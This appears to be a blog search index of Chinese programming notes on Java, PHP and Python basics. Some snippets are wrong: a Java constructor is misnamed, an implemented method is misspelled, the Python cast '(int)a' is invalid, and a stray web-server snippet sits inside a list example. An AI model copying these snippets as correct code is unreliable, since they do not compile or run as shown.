一个类里面的方法可以相互调用，构造方法之间可以通过this()相互调用（不能与super()重复） 方法覆盖/重写(override)当子类的方法与父类的方法重名(指参数，方法名，返回值)时，则优先使用子类的方法 这个方法不能设置成私有的，会说权限不够 方法重载(overload)与重写(override) 方法重写 方法重载 子类和父类 一个类 参数，返回值，方法名一样 方法名+参数不一样 final修饰符可以与public，private修饰符一起用 1.修饰类表示这个类无法被继承 2.修饰方法表示这个方法不能被子类重写 3.修饰变量 final int a=10; 则该变量后面不能被赋值（变成常量） final int a; 可以被赋值一次 类包package在开发大项目时，难免会遇到类名重复的问题，所以可以使用包类进行管理类 定义在开头写上package xx.xx.xx 命名规则 习惯上以域名开头 com.xx.xx 终端编译javac -d . src.java -d指定编译根目录 访问权限修饰符 public protected default private 同类 yes yes yes yes 同包 yes yes yes no 子父类 yes yes no no 不同包 yes no no no 对类的修饰只有public和default，因为类分为包内包外（内部类除外） 内部类类中再定义一个类就是内部类，此类相对来说就是外部类 内部类可以访问外部类的所有成员 外部类不能访问内部内的所有成员，因为他们是一对多的关系，外部类不知道是那个类的成员 内部类依附外部类而存在 非静态内部类不能声明静态成员 使用12345//1外部类.内部类 对象 = new 外部类().new 内部类();//2外部类 对象 = new 外部类();外部类.内部类 对象 = new 内部类(); 局部内部类在方法里面创建类就叫局部内部类 匿名内部类JDK8当类只需要使用一次时，写成一个类有点浪费，于是有了匿名内部类 比如实现接口的功能只需要用一次时 1234567891011121314151617181920interface Product{ int getPrice(); String getName();}class innerClass{ public static void main(String[] args){ System.out.println( //因为没有名字，所以叫匿名内部类 new Product(){ public int getPrice(){ return 2; } public String getName(){ return &quot;笔&quot;; } }.getName ); }} 例2 123456789101112131415161718192021class InnerClass{ public static void test(Vehicle f){ f.transit(); } public static void main(String[] args){ test( new Vehicle(){ public void transit(){ System.out.println(&quot;test&quot;); } } ); test( () -&gt; System.out.println(&quot;test&quot;) ); } }interface Vehicle{ public void transit(); } 匿名内部类也可以传递参数，参数参照父类的构造方法 重名当外部类和内部类重名时，访问遵循就近原则，若想访问特定的成员，可以使用类名.this.成员进行访问","link":"/Programming/Java/day6_%E7%BB%A7%E6%89%BF.html"},{"title":"多态与接口","text":"同一个操作有不同的做法 多态利用父类声明，子类构造就是多态，如 父类 对象 = null; 对象 = new 子类(); 因为是用父类声明的，所以只能访问父类的成员 若要访问子类的成员，需要强制类型转换，如 ((子类)对象).成员 注意，不能使用子类声明，父类构造 详解多态 抽象类功能当我们的类需要同一个方法，但这个方法却有不同的是实现时，可以使用抽象类进行继承重写这个方法 例1234567891011121314151617181920212223242526272829303132333435/* 在公司工作的都是雇员 * 他们都需要工作，但工作的 * 做法不同，所以将工作抽象 */abstract class Employee{ private String name; /* 虽然是抽象类，构造方法也是可以继承的， * 这个构造方法是给子类的 */ public Employee(String name){ this.name = name; } //抽象方法，子类实现 public abstract void work();}class Programmer extends Employee{ public Programmer(String name){ super(name); } public void work(){ //实现的代码,比如 System.out.println(&quot;我在编程&quot;); }}class Manager extends Employee{ public Programmer(String name){ super(name); } public void work(){ //实现的代码，比如 System.out.println(&quot;我在管理&quot;); }} 注意 抽象方法必须在抽象类里面 抽象类里面不一定要有抽象方法 抽象类可以被继承抽象类，但子类必须实现上面所有的类的抽象方法 接口 相当于一个标准，规范，一切实现都需要通过子类 接口里面只能包含抽象方法（完全抽象化） 接口可以被实现，不能被继承 接口可以被抽象类实现，也可以被具体类实现 例123456789101112131415161718//定义接口interface A{ void method1(); void method2(); void method3();}//类被继承，接口被实现class B implements A{ public void methid1(){ //具体实现 } public void methid2(){ //具体实现 } public void methid3(){ //具体实现 }} 注意 w单继承，多实现 class Test extends 类 implements 接口1,接口2{} 注意用什么类声明，什么类构造 接口也可以被接口继承","link":"/Programming/Java/day7_%E5%A4%9A%E6%80%81%E4%B8%8E%E6%8E%A5%E5%8F%A3.html"},{"title":"简单使用Eclipse","text":"注意记录一些快捷键和一些欲哭无泪的事 注意改成等宽字体，不然很难受 快捷键 组合键 含义 ctrl+shift+F 代码格式化 alt+方向左右或ctrl+PD/PU 切换项目卡 alt+方向上下 交换上下行位置 ctrl+/ 将选中的行注释或取消注释 ctrl+shift+/或\\ 将选中注释或取消注释 ctrl+d 删除一行 ctrl+shift+O 自动引入包删除包 ctrl+F11 run ctrl+alt+down/up 快速复制 ctrl+1 修复错误 eclipse编译环境下载对应版本，在eclipse设置即可","link":"/Programming/Java/day8_ide_eclipse.html"},{"title":"工具类","text":"平常会用到的一些工具 Arrays数组工具类举个例子 123456789101112131415import java.util.Arrays;public class ArrarysTest { public static void main(String[] args) { int[] a = {234,24,25,2323,25,45}; Arrays.sort(a); for(int i : a) { System.out.print(i+&quot; &quot;); } System.out.println(); //先排序，后查找 int index = Arrays.binarySearch(a, 234); System.out.println(index); }} Math工具类举个例子 123456789101112public class MathTest { public static void main(String[] args) { System.out.println(Math.pow(2, 1)); System.out.println(Math.E); System.out.println(Math.PI); System.out.println(Math.abs(-9)); System.out.println(Math.ceil(3.4)); System.out.println(Math.floor(3.5)); System.out.println(Math.max(32,34)); System.out.println(Math.cos(3)); }} 结果 123456782.02.7182818284590453.14159265358979394.03.034-0.9899924966004454 随机数1234System.out.println(Math.random());//[0-1)的随机System.out.println(Math.random()*4);//[0-4)的随机数System.out.println((Math.random()*4)+5);//[5-9)的随机数System.out.println((int）((Math.random()*4)+5));//5,6,7,8的随机数 BigDecimal先简单说明一下double精度的问题，由于浮点数在计算机里面特殊的存储方法，所以double总会有精度的损失，double的精度在15-16位，所以只要出错大于这个位数，double就不会显示出来，如果在这个范围内出错了，double也会显示出来，反正不管如何，用double存储数据都是有风险的，于是可以用Math里的BigDecimal解决这个问题 举个例子 1234567891011121314151617181920212223242526272829package com.manu3.bigdecimal;import java.math.BigDecimal;public class BigDecimalTest { public static void main(String[] args) { // double a = 2.32435435;// double b = 0.30000000000000002;// double c = 0.1;// double d = 0.2;// System.out.println(1.0+0.1);// System.out.println(b);// System.out.println(c+d); BigDecimal num1 = new BigDecimal(&quot;0.04&quot;); BigDecimal num2 = BigDecimal.valueOf(0.02); System.out.println(num1); System.out.println(num2); BigDecimal result1 = num1.add(num2); BigDecimal result2 = num1.subtract(num2); BigDecimal result3 = num1.multiply(num2); BigDecimal result4 = num1.divide(num2); System.out.println(result1); System.out.println(result2); System.out.println(result3); System.out.println(result4); }} Date&amp;Calender类举个例子 12345678910111213141516171819package com.manu3.date;import java.util.Calendar;import java.util.Date;public class DateCalenderTest { public static void main(String[] args) { Date now = new Date(); System.out.println(now); Calendar c = Calendar.getInstance(); System.out.println(c); System.out.println(c.get(Calendar.AM)); System.out.println(c.get(Calendar.DATE)); System.out.println(c.get(Calendar.HOUR)); System.out.println(c.get(Calendar.MINUTE)); }} 基本类型包装类基本数据一般都在栈里面，而包装就是栈存地址，数据在堆里 1.Byte 2.Short 3.Integer 4.BigInteger（可以存一个大整数），与BigDecimal差不多 5.Long 6.Float 7.Double 8.Character 9.Boolean 举个例子吧 12345678910111213141516package com.manu4.packageclasss;public class PackagingClass { public static void main(String[] args) { Integer n1 = Integer.valueOf(&quot;100&quot;); System.out.println(n1); Byte n2 = Byte.valueOf(&quot;100&quot;); System.out.println(n2); Long n3 = Long.valueOf(&quot;100&quot;); System.out.println(n3); Float n4 = Float.valueOf(&quot;100.234&quot;); System.out.println(n4); Double n5 = Double.valueOf(&quot;100.2345325&quot;); System.out.println(n5); }} 拆箱和装箱其实赋值没必要像上面那样麻烦 12Integer n1 = 100;//自动装箱，把100包装再复制n1 += 100;//自动拆箱，i = i.valueInt()+100,再装箱","link":"/Programming/Java/day9_%E5%90%84%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%B1%BB.html"},{"title":"CI框架","text":"CodeIgniter 是一个小巧但功能强大的 PHP 框架，作为一个简单而“优雅”的工具包，它可以为开发者们建立功能完善的 Web 应用程序。 Controller 采用MVC的常见url: 1http://example.com/[controller-class]/[controller-method]/[arguments] 控制器将是你 Web 应用程序中处理请求的核心 [linux]控制器文件名严格区分大小写 Model 遵循MVC, 需要将数据库的操作代码写在模型（Model）文件里面 踩的坑在CodeIgniterI4.11里面, request的getVar等方法需要添加下面的代码 123456/** * Instance of the main Request object. * * @var HTTP\\IncomingRequest */ protected $request; 写数据库需要allowedFields 将app/config/filter.php里的toolbar取消","link":"/Programming/PHP/CodeIgniter.html"},{"title":"Laravel笔记","text":"摘要 Artisan Commands command action php artisan make:controller &lt;ControllerName&gt; create new Controller php artisan route:list show route list 在 LearnKu 学习 L01 所踩的坑 全程使用 Sail 虚拟环境学习, 注意 docker-compose.yml 和 .env 文件的变量 MySql 数据库报错1 1SQLSTATE[HY000] [2002] Connection refused (SQL: select * from information_schema.tables where table_schema = laravel8 and table_name = migrations and table_type = 'BASE TABLE') 解决方法：将 .env 下的 DB_HOST 改为 mysql 即使翻墙，Sail也会有概率构建失败，未找到原因 compact() 可以将一组变量转换为数组，键为变量名 注意随时运行 npm run watch-poll 使用 withInput() 后模板里 old(‘email’) 将能获取到上一次用户提交的内容 Str::str_plural() 输出单词的复数","link":"/Programming/PHP/Laravel.html"},{"title":"PHP基础学习笔记","text":"PHP（全称：PHP：Hypertext Preprocessor，即“PHP：超文本预处理器”）是一种开源的通用计算机脚本语言，尤其适用于网络开发并可嵌入HTML中使用 PHP的超全局变量 $_SERVER是PHP里面的超全局变量, 包含了web服务器提供的所有信息.可通过phpinfo()查看 $_SERVER['PHP_SELF']得到自身文件名 $GLOBALS $_GET $_POST $_FILES $_COOKIE $_SESSION $_REQUEST $_ENV 基础 描述变量使用$或者${}, 前者会匹配更多字符让其合法 &lt;?php echo==&lt;?= 纯php文件文末结束符可省略 支持#,//,/* */注释(//,#后面的?&gt;不会被注释), /* */不可嵌套 PHP 支持 10 种原始数据类型 如果想查看某个表达式的值和类型，用 var_dump() 函数。 如果只是想得到一个易读懂的类型的表达方式用于调试，用 gettype() 函数。要检验某个类型，不要用 gettype()，而用 is_type 函数 如果要将一个变量强制转换为某类型，可以对其使用强制转换或者 settype() 函数, 使用*符号也能改变类型 整型 要使用八进制表达，数字前必须加上 0（零）。要使用十六进制表达，数字前必须加上 0x。要使用二进制表达，数字前必须加上 0b 将 resource 转换成 integer 时， 结果会是 PHP 运行时为 resource 分配的唯一资源号 PHP 7.4.0 之前不支持_, 如1_234 浮点型 永远不要相信浮点数结果精确到了最后一位，也永远不要比较两个浮点数是否相等。如果确实需要更高的精度，应该使用任意精度数学函数或者 gmp 函数 由于 NAN 代表着任何不同值，不应拿 NAN 去和其它值进行比较，包括其自身，应该用 is_nan() 来检查 String字符串 .与.= 1234567&lt;?php$a = &quot;Hello &quot;;$b = $a . &quot;World!&quot;; // now $b contains &quot;Hello World!&quot;$a = &quot;Hello &quot;;$a .= &quot;World!&quot;; // now $a contains &quot;Hello World!&quot;?&gt; 单引号代表的字符串里的\\转义符能转'\\两个字符, \\n没有任何含义, 在单引号里的$失去了变量的含义(类似linux) 双引号里的\\能转移一些特殊字母和解析$变量 在{}里面可以使用多重变量, 如 1234567891011&lt;?phpclass foo { var $bar = 'I am bar.';}$foo = new foo();$bar = 'bar';$baz = array('foo', 'bar', 'baz', 'quux');echo &quot;{$foo-&gt;$bar}\\n&quot;;echo &quot;{$foo-&gt;{$baz[1]}}\\n&quot;;?&gt; []与{}都可以访问字符串片段 .可以连接字符串 heredoc结构类似linux的cat &gt; file.name &lt;&lt; eof, 可输入转义字符和变量, 如 1234567&lt;?php$str = &lt;&lt;&lt;EODExample of stringspanning multiple linesusing heredoc syntax.EOD;?&gt; 更多用法 newdoc结构 与heredoc的区别是不具备转义和解析变量的能力 1234567&lt;?php$str = &lt;&lt;&lt;'EOD'Example of stringspanning multiple linesusing nowdoc syntax.EOD;?&gt; Array数组123456789101112&lt;?php$array = array( &quot;foo&quot; =&gt; &quot;bar&quot;, &quot;bar&quot; =&gt; &quot;foo&quot;,);// 自 PHP 5.4 起$array = [ &quot;foo&quot; =&gt; &quot;bar&quot;, &quot;bar&quot; =&gt; &quot;foo&quot;,];?&gt; PHP的Array支持键值对 可以使用array()或者[]初始化一个array对象 key只能是interge和string 使用print_r或者var_dump函数来输出array 要删除某键值对，对其调用 unset() 函数。 unset() 函数允许删除数组中的某个键。但要注意数组将不会重建索引。如果需要删除后重建索引，可以用 array_values() 函数 foreach 控制结构是专门用于数组的。它提供了一个简单的方法来遍历数组。 数组最后一个元素的 $value 引用在 foreach 循环之后仍会保留。建议使用 unset() 来将其销毁。 Iterable Iterable是 PHP 7.1 中引入的一个伪类型。它接受任何 array 或实现了 Traversable 接口的对象。这些类型都能用 foreach 迭代， 也可以和 生成器 里的 yield from 一起使用 类在扩展/实现（extending/implementing）的时候， 可以将参数类型从 array 或 Traversable 放宽到 iterable， 也可以将返回类型 iterable 的范围缩小到 array 或 Traversable Resource资源 resource 是一种特殊变量，保存了到外部资源的一个引用。资源是通过专门的函数来建立和使用的。所有这些函数及其相应资源类型见附录。 参见 get_resource_type() 持久数据库连接比较特殊，它们不会被垃圾回收系统销毁。参见数据库永久连接一章 NULLnull不区分大小写 PHP8.0.0新增了一个类型mixed, 代表任意类型 namespace可以避免与其它用户空间代码出现命名空间冲突 变量 PHP变量区分大小写 变量名规则^[a-zA-Z_\\x80-\\xff][a-zA-Z0-9_\\x80-\\xff]*$ PHP变量名可以使用中文 &amp;引用赋值(只有有名字的变量才可以引用赋值) PHP 提供了大量的预定义变量, 超全局变量列表 PHP 中全局变量在函数中使用时必须声明为 global或者使用$GLOBALS数组 1234567891011121314151617181920212223242526# global&lt;?php$a = 1;$b = 2;function Sum() { global $a, $b; $b = $a + $b;}Sum();echo $b;# GLOBALS$a = 1;$b = 2;function Sum(){ $GLOBALS['b'] = $GLOBALS['a'] + $GLOBALS['b'];}Sum();echo $b;?&gt; 静态变量在离开函数后不会被销毁, 声明static $var 可变变量使用$$ 要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下 $$a[1] 时，解析器需要知道是想要 $a[1] 作为一个变量呢，还是想要 $$a 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 ${$a[1]}，对第二种情况用 ${$a}[1] 对于对象, $foo-&gt;$bar将bar解析后作为foo的属性 注意: 在 PHP 的函数和类的方法中，超全局变量不能用作可变变量。$this 变量也是一个特殊变量，不能被动态引用 常量 定义规则^[a-zA-Z_\\x80-\\xff][a-zA-Z0-9_\\x80-\\xff]*$ 使用define(name, value) 和const定义一个常量 const打小写敏感 PHP预定义常量 表达式 三元表达式 1$first ? $second : $third 运算符 除了基本的比较运算符外, PHP还支持===(值与类型相等)和!== PHP支持递增和递减运算符和**运算符 PHP 支持引用赋值，使用$var = &amp;$othervar;语法。引用赋值意味着两个变量指向了同一个数据(类型linux硬链接) 对象复制 new 运算符自动返回一个引用，因此对 new 的结果进行引用赋值是错误的 NULL 合并运算符?? &lt;=&gt;返回-1 0 1 PHP 支持一个错误控制运算符：@。当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。 @ 运算符只对表达式有效。对新手来说一个简单的规则就是：如果能从某处得到值，就能在它前面加上 @ 运算符 (``)命令执行运算符 1234&lt;?php$output = `ls -al`;#输出当前目录所有文件及详细信息echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;?&gt; 在windows上, 如果输出是二进制文件, 需要使用popen(), 因为windows的管道是以文件形式打开的 &amp;&amp;,||,比and,or运算优先级高. 数组运算符 instanceof 用于确定一个 PHP 变量是否属于某一类 class,确定一个变量是不是继承自某一父类的子类 流程控制 elseif与else if语义一样, 区别在于前者可以使用冒号, 后者不行 1234567891011121314151617181920&lt;?php/* 不正确的使用方法： */if ($a &gt; $b): echo $a.&quot; is greater than &quot;.$b;else if ($a == $b): // 将无法编译 echo &quot;The above line causes a parse error.&quot;;endif;/* 正确的使用方法： */if ($a &gt; $b): echo $a.&quot; is greater than &quot;.$b;elseif ($a == $b): // 注意使用了一个单词的 elseif echo $a.&quot; equals &quot;.$b;else: echo $a.&quot; is neither greater than or equal to &quot;.$b;endif;?&gt; PHP 提供了一些流程控制的替代语法，包括 if，while，for，foreach 和 switch。替代语法的基本形式是把左花括号（{）换成冒号（:），把右花括号（}）分别换成 endif;，endwhile;，endfor;，endforeach; 以及 endswitch; 123456789101112131415&lt;?php if ($a == 5): ?&gt;A is equal to 5&lt;?php endif; ?&gt;&lt;?phpif ($a == 5): echo &quot;a equals 5&quot;; echo &quot;...&quot;;elseif ($a == 6): echo &quot;a equals 6&quot;; echo &quot;!!!&quot;;else: echo &quot;a is neither 5 nor 6&quot;;endif;?&gt; 注意如果不是^&lt;?php这样写的话会输出空格 foreach不支持使用@来抑制错误信息 函数 使用默认参数时，任何默认参数必须放在任何非默认参数的右侧 ...指定可变参数, 也可用于传递array作为函数参数 :命名参数允许传入乱序的参数, 需要指定参数名 命名参数也可以与位置参数相结合使用。此种情况下，命名参数必须在位置参数之后 PHP支持可变函数, 函数名和方法名都可以使用变量指定 箭头函数支持与 匿名函数 相同的功能，只是其父作用域的变量总是自动的 会参考参数去父作用域中寻找是否有该值 匿名函数需要使用use继承父作用域的变量 123456$message = 'hello';// 继承 $message$example = function () use ($message) { var_dump($message);}; 匿名函数会自动绑定当前实例this, 可以使用静态匿名函数阻止绑定 常用函数1234# 取整(PHP4,5,6,7,8),参数mode传入常量,代表四舍五入还是直接舍去小数round ( float $val , int $precision = 0 , int $mode = PHP_ROUND_HALF_UP ) : float# 整除(PHP7,8)intdiv ( int $dividend , int $divisor ) : int isset() substr() substr_replace() 字符串函数 数组函数 变量函数 数学函数 error_get_last() shell_exec() get_class() is_a() 语言结构 语言结构就是PHP本身支持的语句, 比如echo, print等. 与函数的区别在于语句的运行速度快, 但缺少了函数的一些特性, 比如函数可以接受其他函数返回的参数等 list(): 解构赋值? array() echo eval() 文本处理RCRE","link":"/Programming/PHP/base.html"},{"title":"文件IO","text":"操作文件 读取12345678910111213141516171819import os# 打印当前目录print(os.getcwd())# 改变工作目录os.chdir(&quot;/home/manu&quot;)print(os.getcwd())# 创建目录os.makedirs(&quot;test1/test2&quot;)# 读取文件with open(&quot;blog/_config.yml&quot;) as file: content = file.read() print(content)# 读取行with open(&quot;blog/_config.yml&quot;) as file: for line in file: print(line.rstrip())# 放在列表里面with open(&quot;blog/_config.yml&quot;) as file: l = file.readlines() 写入1234567import os # 覆盖with open(&quot;pytext.txt&quot;,&quot;w&quot;) as file: file.write(&quot;hello,world!&quot;)# 追加with open(&quot;pytext.txt&quot;,&quot;a&quot;) as file: file.write(&quot;hello,world!&quot;)","link":"/Programming/Python/IO.html"},{"title":"基础","text":"Python是一种跨平台的计算机程序设计语言。 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。最初被设计用于编写自动化脚本(shell)，随着版本的不断更新和语言新功能的添加，越多被用于独立的、大型项目的开发。 适用范围 Web 和 Internet开发 科学计算和统计 人工智能 桌面界面开发 软件开发 后端开发 网络爬虫 基础运算符12345678n1 = 1 + 2n2 = 1 - 3n3 = 3 / 2# 取整n4 = 3 // 2n5 = 3 * 8# 乘方n6 = 3 ** 4 字符串1234# 组拼s1 = &quot;hello&quot; + str(23)# 复制3份s2 = &quot;hello&quot; * 3 输出123print(&quot;hello&quot;)# 不换行print(&quot;world&quot;,end=&quot;&quot;) 输入1234# 等待输入，返回的是字符串a = input()# 转换类型a = (int)a python之禅在python终端输入import this会出现英文诗，是python的彩蛋，是一段编程思想，代表python的语言规范，给我印象最深的是那句“如果你无法向别人描述你的方案，那肯定不是一个好的方案，反之亦然” 关于python之禅 列表12345678910111213141516171819202122232425list = []list1 = [ 12,23,412,312,42 ]# 访问整个列表print(list1)# 访问单个数据,索引从0开始print(list1[1])# 访问倒数第3个元素print(list1[-3])# 访问子列表,不包括结束索引print(list1[0:3])# print(list1[:2])默认从头部开始# print(list1[2:])截取到尾部# print(list1[:])==list1list2 = [ &quot;hello&quot;,&quot;world&quot;]# 添加数据list2.append(&quot;test&quot;)# 插入数据list2.insert(0,&quot;test2&quot;)# 通过索引删除数据del(list2[2])del list2[2] # 通过值删除数据list2.remove(&quot;hello&quot;)# 获取索引lis2.index(&quot;hello&quot;) pop12list2.pop(2)# 返回list[2]的值，并且删掉它 排序12345678910# sort，会修改原数据# 字母a-z# 数字1-9# 可以使用传递reverse=True改变排序方式list2.sort()print(list2)# 不改变源数据newList = sorted(list1)# 单纯翻转数据list1.reverse() 长度12# 获取列表长度print(len(list1)) 多维列表指列表里面还是列表 1234# 定义l1 = [ [1,2,3,4],[5,6,7,8],[9,0] ]# 使用print(l1[0][2]) 三维，四维都可以 遍历 直接遍历数据 123456# for循环，注意冒号for i in l1: # 缩进的表示循环体 print(i)# 没缩进的就是单独的语句print(&quot;test&quot;) ​ python对缩进，空格有严格的要求 规律列表 1234# 不包含结束print(list(range(2,10)))# 可以设置补长，默认1print(list(range(2,10,2))) 通过遍历索引来遍历数据 1234list1 = list(range(2,10,2))# 代表2-10步进为2for i in range(0,len(list1)): print(list1[i]) 遍历加处理 1234567list2 = []for i in range(0,10): list2.append(i**2)print(&quot;list2:&quot;+str(list2))# 简写list3 = [ i**2 for i in range(0,10)]print(&quot;list3:&quot;+str(list3)) 简单处理数字123min(list1)max(list1)sum(list1) 复制1234567891011121314# 复制列表list4 = list3[:]# server.py# 从wsgiref模块导入:from wsgiref.simple_server import make_server# 导入我们自己编写的application函数:from hello import application# 创建一个服务器，IP地址为空，端口是8000，处理函数是application:httpd = make_server('', 8000, application)print('Serving HTTP on port 8000...')# 开始监听HTTP请求:httpd.serve_forever()# 复制引用(地址)list5 = list3 合并123# 列表的合并list2.extend(list3)list2 += list3 元组不可修改的列表 123l = ( 1,2,3,4 )# errorl.append(3) 条件分支1234567891011121314151617181920212223n = 14if n&gt;10: print(&quot;执行语句1&quot;)elif n&lt;20: print(&quot;执行语句2&quot;)else: print(&quot;执行语句3&quot;)# 布尔值a = 2b = 3res1 = a &gt; bres2 = a == bprint(res1)print(res2)# 多个条件res = n &gt;= 18 and n &lt;= 40res = n &lt;=3 or n &gt;= 50# 判断是否在列表存在l = [ 1,2,3,4 ]res3 = 1 in lres4 = 2 not in lprint(res3)print(res4) 循环12345678910111213i = 0while i&lt;10: print(i) i += 1# 中途退出循环flag = Truewhile flag: print(i) i += 1 if i == 20: flag = False # 或者break","link":"/Programming/Python/Py-base.html"},{"title":"类","text":"类的定义与继承 定义12345678class Animal(): # 构造方法 def __init__(self,name,age): self.name = name self.age = age # self必须写，代表自身 def sleep(self): print(self.name+&quot;在睡觉&quot;) 继承因为python是多继承，所以使用super()需要参数表示哪个使用哪个父类 第一个参数代表当前类 第二个参数self代表实例 意思就是根据实例去找类的父类，不同的实例就会有不同的父类 使用super只会调用第一个父类 在python3中支持super()的写法 123456789class Cat(Animal): # 调用父类的构造方法 def __init__(self,name,age): super(Cat,self).__init__(name,age) def catch(self): print(self.name+&quot;在抓老鼠&quot;) cat1 = Cat(&quot;xiaobai&quot;,1)cat1.catch() 方法重写和实例属性12345678910111213141516171819202122232425class Animal(): def __init__(self,name,age): self.name = name self.age = age def sleep(self): print(self.name+&quot;在睡觉&quot;)class Cat(Animal): def __init__(self,name,age,hair_color): super().__init__(name,age) # 实例类作为猫的属性，方便管理 self.hair_color = Body(hair_color) def catch(self): print(self.name+&quot;在抓老鼠&quot;) # 重写 def sleep(self): print(self.name+&quot;趴着睡觉&quot;)class Body(): def __init__(self,hair_color): self.hair_color = hair_colorcat1 = Cat(&quot;xiaobai&quot;,1,&quot;white&quot;)cat1.catch()","link":"/Programming/Python/class.html"},{"title":"装饰器","text":"当需求变更，在给函数添加新功能时，遵循”对修改是封闭的，对扩展是开放的”，也就是说不去修改函数而是扩展函数 举个简单的栗子 123456def f1(): print(&quot;this is f1&quot;)def f2(): print(&quot;this is f2&quot;)f1()f2() 需要给上面的函数新增一个打印当前时间的功能，为了不破坏原有的函数，可以这样做 12345678910111213import timedef f1(): print(&quot;this is f1&quot;)def f2(): print(&quot;this is f2&quot;)# f1()# f2()def current_time(func): print(time.time()) func()current_time(f1)current_time(f2) 这种做法不怎么”优雅”，它改变了原有的结构，改变了调用方式，解决的办法就是装饰器 定义装饰器本质就是函数或类，python是可以将函数作为参数进行传递和返回的 12345def decorator(func): def wrapper(): print(time.time()) func() return wrapper 那怎么使用呢？如果采用下面的方式 12t = decorator(f1)t() 这样其实还是破坏了原有结构，接下来使用语法糖 语法糖@就是装饰器的语法糖，之所以叫语法糖是因为看着舒服，写着舒服，就像吃了糖一样（与其对应的还有语法盐） 它的作用就是可以省略赋值操作 123456789101112131415import timedef decorator(func): def wrapper(): print(time.time()) func() return wrapper@decoratordef f1(): print(&quot;this is f1&quot;)@decoratordef f2(): print(&quot;this is f2&quot;)f1()f2() 定义了装饰器，使用了语法糖，而原函数和调用都没有改变 参数上面都是没有参数的函数，当函数有一个甚至多个参数时装饰器又该怎么改变呢 1234567891011121314import timedef decorator(func): def wrapper(p1): print(time.time()) func(p1) return wrapper@decoratordef f1(p1): print(&quot;this is &quot;+p1)@decoratordef f2(p1,p2): print(&quot;this is &quot;+p1+p2)f1(p1) 如果在装饰器内指定参数个数的话，那么它就不具有通用性了，这没有任何意义，需要使用可变参数 123456789101112131415import timedef decorator(func): def wrapper(*args): print(time.time()) func(*args) return wrapper@decoratordef f1(p1): print(&quot;this is &quot;+p1)@decoratordef f2(p1,p2): print(&quot;this is &quot;+p1+p2)f1('p1')f2('p1','p2') 当某函数有关键字参数呢 1234567891011import timedef decorator(func): def wrapper(*args,**kw): print(time.time()) func(*args,**kw) return wrapper@decoratordef f3(**kw): print(kw)f3(name='manu',age=19) 这时装饰器就算完整了，适用所有函数","link":"/Programming/Python/decorator.html"},{"title":"理解字典、列表","text":"字典类似列表，列表使用’’索引-数据”的形式存储数据，字典使用键值对的形式存储数据 列表只能存储一种数据类型，而且索引固定 字典的“键”和“值”可以是任意类型，这里的“键”相当于列表的索引 列表在内存的数据是有序的，字典是无序的 12345678910# 创建字典stu1 = { &quot;name&quot;:&quot;manu&quot;,&quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot; }# 添加stu1[&quot;hobby&quot;] = &quot;coding&quot;# 访问print(stu1[&quot;name&quot;])# 修改stu1[&quot;age&quot;] = 20# 删除del stu1[&quot;gender&quot;] 字典与列表的嵌套1234567891011121314# 创建一个存储所有学生的列表，里面包含学生的各种信息stu = [{ &quot;name&quot;:&quot;manu&quot;,&quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot; }, { &quot;name&quot;:&quot;manu&quot;,&quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot; }, { &quot;name&quot;:&quot;后排&quot;,&quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot; }, { &quot;name&quot;:&quot;sb1号&quot;,&quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot; }, { &quot;name&quot;:&quot;sb2号&quot;,&quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot; }]# 访问print(stu[2][&quot;name&quot;])# 字典里面嵌套列表stu2 = { &quot;name&quot;:&quot;manu&quot;, &quot;age&quot;:19,&quot;gender&quot;:&quot;male&quot;, &quot;hobby&quot;:[&quot;programing&quot;,&quot;coding&quot;]}print(stu2[&quot;hobby&quot;][1]) 判断是否相等12d1 == d2# 等于返回True 列表是有顺序的，判断时顺序不对也就不相等 字典是无序的，键和值对等则就相等 遍历键12345678# m1for i in dict1.keys(): print(i)# m2print(dict1.keys)# m3 keys = list(dict1.keys)print(keys) 值12345678# m1for i in dict1.values(): print(i)# m2print(dict1.values)# m3 values = list(dict1.values)print(values) 键值对12345678910# m1 通过items返回的是一个元组)for i in dict1.items(): print(i) # 单独访问键与值 print(i[0],i[1]) # m2 for k,v in dict1.items(): # 单独访问键与值 print(k,v) 判断是否存在123456# 判断是否存在值，返回布尔值&quot;test&quot; in dict1.values()# 判断是否存在键，返回布尔值&quot;test&quot; in dict1.keys()# 默认判断键&quot;test&quot; in dict1 默认值一般情况下使用字典都不会知道里面的数据，可以设置一个默认值 12# 当key存在则使用它的值，不存在则使用默认值dict1.setdefault(&quot;key&quot;,&quot;value&quot;)","link":"/Programming/Python/dict.html"},{"title":"异常处理","text":"把这个单独写是不是太水了 123456789try: i = 9/0# 捕捉异常except ZeroDivisionError: print(&quot;0不能做分母&quot;)# 没出现异常执行的代码（可不写）else: print(&quot;没有异常&quot;)print(&quot;end&quot;)","link":"/Programming/Python/exception.html"},{"title":"函数编程","text":"高阶函数编程 闭包定义：在内部函数中，对外部的变量进行引用，外部函数返回内部函数。简单来说，闭包=环境+函数块 例子 1234567891011def p(): x = 0 def go(step): nonlocal x new_pos = x + step x = new_pos return x return got = p()print(t(4))print(t(5)) 匿名函数也叫lambda表达式，强调表达式 1lambda parameter_list: expression 三元表达式1a if a &gt; b else b map12# 会将list的数据都传入 fun函数 接收map(fun,list) fun可以用lambda 参数可以有多个 返回的列表个数取决于参数列表个数的最小值 返回的是一个对象 reduce123456from functools import reducel = [1,2,3,4,5,6,7,8]t = reduce(lambda x,y: x+y,l )print(t) 他会对lambda进行连续调用 上面的运行过程是：先从l取出1,2相加，结果传入x，再从l取出3传入y.. 还可以指定一个初始值传入x filter123l2 = ['a','b','C','A','Z']f = filter(lambda x: ord(x)&gt;=65 and ord(x)&lt;91,l2)print(list(f)) 将列表的数据传入函数，结果为真保留数据 结果只要能判断真假就行，不一定需要布尔值","link":"/Programming/Python/function-programmin.html"},{"title":"简单使用方法","text":"就是函数 定义123def funName(p1,p2): funBody return 没有返回值时返回None 参数位置参数 定义了方法的参数，然后使用方法按照位置填入参数 关键字参数 指定参数名=值 1print(&quot;hello&quot;,&quot;world&quot;,sep=&quot;-&quot;,end=&quot;&quot;) 默认值 